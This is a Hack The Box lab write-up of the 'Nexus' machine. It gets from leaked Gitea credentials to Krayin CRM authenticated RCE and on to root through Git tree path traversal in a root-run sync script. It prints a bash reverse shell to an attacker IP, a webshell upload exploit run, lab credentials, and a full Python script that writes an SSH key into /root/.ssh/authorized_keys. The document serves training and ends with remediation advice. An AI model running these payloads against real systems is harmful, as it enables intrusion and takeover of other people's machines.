---
title: "HTB Nexus Writeup: Krayin CRM RCE to Git Template Path Traversal Root"

title_post: "HTB Nexus Writeup: Krayin CRM RCE to Git Template Path Traversal Root"

date: 2026-08-09 12:00:00 +0500

categories:
  - HTB
  - Linux
  - Easy

tags:
  - htb-linux-easy
  - htb
  - linux
  - krayin-crm
  - gitea
  - web-exploitation
  - rce
  - path-traversal
  - credential-exposure
  - privilege-escalation
  - cve-2026-38526

description: Detailed Hack The Box Nexus writeup. Exploit Krayin CRM RCE (CVE-2026-38526), pivot to user jones via database credential reuse, and escalate to root via Gitea sync script path traversal.

image:
  path: /assets/img/writeups/nexus/banner.png
  alt: HTB Nexus Writeup
---
## 1. Machine Information

| Machine | Nexus |
|---------|-------|
| Platform | [HackTheBox](https://www.hackthebox.com/) |
| OS | Linux |
| Difficulty | Easy |
| Initial Access | Krayin CRM Authenticated RCE (CVE-2026-38526) |
| Privilege Escalation | Git Tree Path Traversal in Cron Sync Script |

## 2. Attack Path


```
Virtual Host Enumeration (git.nexus.htb & billing.nexus.htb)
                    ↓
Gitea Repository Leak (krayin-docker-setup .env)
                    ↓
Krayin CRM Authenticated RCE (CVE-2026-38526)
                    ↓
Initial Foothold (www-data)
                    ↓
Password Reuse to User Access (jones)
                    ↓
Systemd Timer Code Audit (/etc/gitea/template-sync.py)
                    ↓
Git Tree Path Traversal (Arbitrary File Write to /root/.ssh/authorized\_keys)
                    ↓
Root Access via SSH
````

## 3. Overview

**Nexus** is an easy-difficulty Linux machine on **Hack The Box** that showcases the risks of exposed source control repositories, web application vulnerability exploitation, credential reuse, and unsafe file handling in elevated background synchronization scripts.

The attack vector begins by enumerating virtual hosts to uncover a self-hosted **Gitea** instance and a **Krayin CRM** application. Environment credentials leaked in a public Gitea repository grant authenticated access to Krayin CRM, which is vulnerable to remote code execution via **CVE-2026-38526**. After obtaining a reverse shell as `www-data`, database environment inspection leads to password reuse for system user `jones`. Privilege escalation to `root` is accomplished by analyzing a custom Python synchronization script run periodically by a `systemd` timer, crafting a malicious Git tree object with path traversal sequences to overwrite `/root/.ssh/authorized_keys`.

## 4. Reconnaissance

An initial Nmap scan was executed against the target IP (`10.129.22.185`):

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines]
└─$ nmap -sC -sV 10.129.22.185 -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to [http://nexus.htb/](http://nexus.htb/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

````

The web server on port 80 redirected to `http://nexus.htb/`. After adding `nexus.htb` to `/etc/hosts`, virtual host enumeration was performed using `ffuf`:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machines]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u [http://nexus.htb](http://nexus.htb) -H "Host: FUZZ.nexus.htb" -c -fs 154

```

```
 :: Method           : GET
 :: URL              : [http://nexus.htb](http://nexus.htb)
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.nexus.htb

billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 163ms]
git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 110ms]

```

The enumeration revealed two active subdomains:

- `billing.nexus.htb`
- `git.nexus.htb`

Both entries were appended to `/etc/hosts`.

> **Key Findings**
> - Port 22 (SSH) and Port 80 (HTTP) are open.
> - Main domain redirects to `nexus.htb`.
> - Discovered subdomains: `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM).
{: .prompt-info }


## 5. Information Disclosure & Enumeration

Navigating to `http://git.nexus.htb/` exposed a public self-hosted Gitea service.

Browsing public repositories revealed `admin/krayin-docker-setup`. Inspecting the repository contents and previous commit history exposed configuration environment details inside `.env`:

![Gitea Repo](/assets/img/writeups/nexus/history-change.png)
_Gitea web portal exposing public repositories and commit logs._
Plaintext

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04

```

Additionally, inspecting the main landing page of `nexus.htb` revealed an internal email address associated with operations: `j.matthew@nexus.htb`.

![J Matthew Email](/assets/img/writeups/nexus/hr-email.png)
_Nexus website showing the j.matthew@nexus.htb contact address._


> **Exposed Credentials**
> Configuration files leaked via Gitea provided potential application credentials:
>
> ```
> Email: j.matthew@nexus.htb
> Password: N27xh!!2ucY04
> Database: krayin
> ```
{: .prompt-warning }




## 6. Initial Shell

Navigating to `http://billing.nexus.htb` presented a **Krayin CRM** administrative login portal.

![Karyin Login](/assets/img/writeups/nexus/karayin-login.png)
_Krayin CRM administrative login interface._

Authenticating with the credentials (`j.matthew@nexus.htb` : `N27xh!!2ucY04`) was successful, granting access to the CRM dashboard.

### i. Vulnerability Identification

The dashboard footer indicated Krayin CRM version `2.2.0`.

![Karyin Version](/assets/img/writeups/nexus/krayin-version.png)
_Krayin CRM version `2.2.0`_

Searching for public exploits associated with this version identified **CVE-2026-38526**, an authenticated Remote Code Execution vulnerability in the admin TinyMCE file upload component allowing arbitrary PHP code deployment.

![cve-2026-38526.png](/assets/img/writeups/nexus/krayin-cve.png)
_"CVE-2026-38526 affecting Krayin CRM v2.2.x._

### ii. Exploitation

A public Proof-of-Concept exploit script was retrieved from GitHub:

[CVE-2026-38526-POC](https://github.com/pawpic/CVE-2026-38526-POC)

The script authenticates to the CRM, extracts the required CSRF tokens, and uploads a PHP webshell into the public storage directory:

```bash
┌──(kali㉿kali)-[~/…/HTB/machines/nexus/CVE-2026-38526-POC]
└─$ python3 exploit.py -u [http://billing.nexus.htb](http://billing.nexus.htb) -e j.matthew@nexus.htb -p 'N27xh!!2ucY04' --lhost 10.10.17.229
[*] Logging in...
[+] CSRF token retrieved: QypJX6A5E3gJeNEvACnCyli8ib4Y7p...
[+] Login successful
[*] Refreshing CSRF token...
[*] Uploading webshell...
[+] Webshell uploaded: [http://billing.nexus.htb/storage/tinymce/65647b97406b2882a43d85b96c23bc65.php](http://billing.nexus.htb/storage/tinymce/65647b97406b2882a43d85b96c23bc65.php)

```

After starting a Netcat listener on port `4444`, the uploaded webshell was triggered via `curl` to spawn a reverse shell:

```bash
┌──(kali㉿kali)-[~]
└─$ curl -G "[http://billing.nexus.htb/storage/tinymce/65647b97406b2882a43d85b96c23bc65.php](http://billing.nexus.htb/storage/tinymce/65647b97406b2882a43d85b96c23bc65.php)" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.17.229/4444 0>&1'"
```

The listener caught the incoming connection:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.229] from (UNKNOWN) [10.129.22.185] 40066
bash: cannot set terminal process group (1466): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 7. Lateral Movement

### i. Internal Environment Audit

Inspecting the application environment file at `/var/www/krayin/.env` revealed the current database credentials:

```
www-data@nexus:~/krayin$ cat .env | grep DB_
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR

```
Checking `/etc/passwd` identified non-standard interactive users on the host:

```bash
www-data@nexus:~/krayin$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

### ii. Credential Reuse

Attempting password reuse with the database password (`y27xb3ha!!74GbR`) against user `jones` via `su` succeeded:

```
www-data@nexus:~/krayin$ su jones
Password: y27xb3ha!!74GbR
jones@nexus:/var/www/krayin$ cd ~
jones@nexus:~$ cat user.txt
<REDACTED>
```

The user flag was successfully retrieved.

## 8. Privilege Escalation

### i. System Timer Audit

Enumerating background scheduled tasks using `systemctl list-timers` revealed a periodic systemd timer running every minute:


```bash
jones@nexus:~$ systemctl list-timers
NEXT                             LEFT LAST                              PASSED UNIT                           ACTIVATES                       
Sat 2026-08-08 02:11:07 UTC       26s Sat 2026-08-08 02:10:07 UTC      33s ago gitea-template-sync.timer      gitea-template-sync.service

```

The `gitea-template-sync.service` unit executes a script located at `/etc/gitea/template-sync.py` under `root` privileges.

```bash
jones@nexus:~$ systemctl cat gitea-template-sync.service
# /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

### ii. Code Analysis

Inspecting `/etc/gitea/template-sync.py` revealed how template repositories are synchronized:


```python
import os, sys, json, subprocess, time, urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"

...

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    # Read tree entries from the bare repository
    GIT = ['git', '-c', 'safe.directory=*']
    result = subprocess.run(
        GIT + ['ls-tree', '-r', 'HEAD'],
        cwd=bare_path, capture_output=True, text=True, timeout=10
    )
    
    entries = []
    for line in result.stdout.strip().split('\n'):
        meta, filepath = line.split('\t', 1)
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        os.makedirs(target_dir, exist_ok=True)
        cat_result = subprocess.run(
            GIT + ['cat-file', 'blob', objhash],
            cwd=bare_path, capture_output=True, timeout=10
        )
        with open(target, 'wb') as f:
            f.write(cat_result.stdout)

```
{: file="/etc/gitea/template-sync.py"}

> **Vulnerability Analysis**
> The script processes raw filenames returned by `git ls-tree -r HEAD` and joins them with `stage_path` using `os.path.join(stage_path, filepath)`.
> If a filename inside the Git tree object contains directory traversal sequences (e.g., `../../../../../root/.ssh/authorized_keys`), `os.path.join` replaces the base destination path completely and writes the blob contents directly to the arbitrary path specified as root.
{: .prompt-warning }

### iii. Exploit Crafting & Arbitrary File Write

To exploit this vulnerability:

1. An SSH key pair was generated in `/tmp`:
   
   ```bash
   ┌──(kali㉿kali)-[/tmp]
   └─$ ssh-keygen -t ed25519 -f /tmp/.k -N ''
   ```
2. Using the credentials recovered during lateral movement (`jones` : `y27xb3ha!!74GbR`), I logged into the Gitea web portal at `http://git.nexus.htb`. After logging in, I created a new repository named `rce` under the `jones` account. Crucially, I made sure to check the **Template** checkbox in the repository settings to ensure the automated sync script would detect and process this repository.

![Template Checked](/assets/img/writeups/nexus/Template-Check.png)

![Template Repo Created](/assets/img/writeups/nexus/repo-creation.png)
_The jones/rce repository configured as a Gitea Template repository._



3. To construct raw Git tree objects containing the directory traversal payload, I utilized a Python exploit script created by [Indigo Shadow](https://medium.com/@indigoshadowwashere/hackthebox-walkthrough-nexus-f48a53ea87d5). The script reads the generated SSH public key from `/tmp/.k.pub` and builds custom Git objects containing path traversal sequences pointing directly to `/root/.ssh/authorized_keys`:

```python
#!/usr/bin/env python3
import hashlib, zlib, os, subprocess, sys, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo"); sys.exit(1)

r = subprocess.run(["cat", "/tmp/.k.pub"], capture_output=True, text=True)
key = r.stdout.strip() + "\n"

blob = write_obj(key.encode(), "blob")
readme = write_obj(b"# Template\n", "blob")
ssh_t = write_obj(entry("100644", "authorized_keys", blob), "tree")
cur = write_obj(entry("40000", ".ssh", ssh_t), "tree")
fir = write_obj(entry("40000", "root", cur), "tree")

for i in range(4):
    fir = write_obj(entry("40000", "..", fir), "tree")

root = write_obj(entry("100644", "README.md", readme) + entry("40000", "..", fir), "tree")
ts = int(time.time())
c = "tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n" % (root, ts, ts)
sha = write_obj(c.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
open(os.path.join(".git", "refs", "heads", "main"), "w").write(sha + "\n")
print("Done: " + sha)

```
{: .file="exploit.py"}

4. The repository was cloned locally, the script was executed to construct the raw objects, and the crafted main branch was pushed to `git.nexus.htb`:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
└─$ cd rce
└─$ python3 exploit.py
Done: 70a980acae33f97ce2a637488bcf9e1f995901c2
└─$ git push origin main

```

Inspecting the repository structure via `git ls-tree` confirmed the traversal entry:

Bash

```
┌──(kali㉿kali)-[/tmp/rce]
└─$ git ls-tree -r HEAD
100644 blob c296a5f621e8f1d1536d8b671d272a96a5d22a7d    README.md
100644 blob 62402624a50678ceef91ea7c5ec15c51e155f657    ../../../../../root/.ssh/authorized_keys
```

### iv. Root Access

Within one minute, the systemd timer executed `/etc/gitea/template-sync.py`. Monitoring `/var/log/template-sync.log` confirmed successful exploitation:

Plaintext

```
[2026-08-08 07:48:25] Template sync starting
[2026-08-08 07:48:25] Found 1 template repo(s)
[2026-08-08 07:48:25] Syncing template: jones/rce
[2026-08-08 07:48:25]   synced: README.md
[2026-08-08 07:48:25]   synced: ../../../../../root/.ssh/authorized_keys
[2026-08-08 07:48:25] Template sync complete

```

The generated SSH public key was written directly into `/root/.ssh/authorized_keys`.

SSH authentication as root succeeded using the matching private key:

```bash
┌──(kali㉿kali)-[/tmp/rce]
└─$ ssh -i /tmp/.k root@nexus.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

root@nexus:~# id
uid=0(root) gid=0(root) groups=0(root)

root@nexus:~# cat /root/root.txt
<REDACTED>

```
The target system was fully compromised.

## 9. Conclusion

Nexus illustrated a complete kill chain involving:

- Subdomain enumeration and exposure of administrative services
- Hardcoded configuration credential leaks in public Git repositories
- Vulnerability exploitation in third-party web CRM software (CVE-2026-38526)
- Password reuse across system accounts
- Unsafe path join operations leading to Path Traversal in privileged background automation scripts

> **Remediation Takeaways**
>
> 1. **Secret & Repository Hygiene:** Never commit sensitive environment files (such as `.env`) to version control. Always include `.env` in `.gitignore` to prevent accidental credential leaks across public or internal repositories.
> 2. **Minimize Information Exposure:** Avoid publishing internal staff emails (e.g., `j.matthew@nexus.htb`) or sensitive system metadata on public landing pages and commit histories, as these provide attackers with targets for user enumeration and credential harvesting.
> 3. **Strict Path Sanitization:** Always sanitize file paths received from external inputs or raw repository object trees (e.g., using `os.path.basename` or strictly validating paths against allowed destination directories) before performing filesystem operations in automated scripts running with elevated permissions.
{: .prompt-tip }